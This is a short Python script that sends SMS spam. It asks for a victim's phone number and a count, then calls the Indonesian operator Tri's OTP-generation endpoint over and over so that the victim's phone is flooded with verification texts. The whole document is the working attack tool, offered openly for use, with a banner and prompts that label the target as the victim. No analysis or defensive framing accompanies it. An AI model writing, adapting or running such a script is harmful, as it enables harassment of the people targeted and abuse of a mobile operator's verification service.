from requests import get,post
__banner__="""
    ########################
    [   SPAM SMS KARTU TRI ]
    [      SHAGITZ         ]
    ########################
"""
print __banner__
class spammerTri():
    def __init__(self):
        self.reqUri="https://registrasi.tri.co.id/daftar/generateOTP"
        self.reqPayload={"msisdn":raw_input('NO HP KORBAN : ')}
        self.reqCount=int(input('JUMLAH : '))
        print("Pesan di proses ...")
        self.sendRequests()
    def sendRequests(self):
        for self.jumlah in range(self.reqCount):
            self.sendPayloads=post(self.reqUri,data=self.reqPayload).text
            if "salah" in self.sendPayloads:
                print("Sms gagal dikirim.")
            else:
                print("Sms telah dikirim shagitz.")
        print("#####SHAGITZSAN####")
spammerTri()
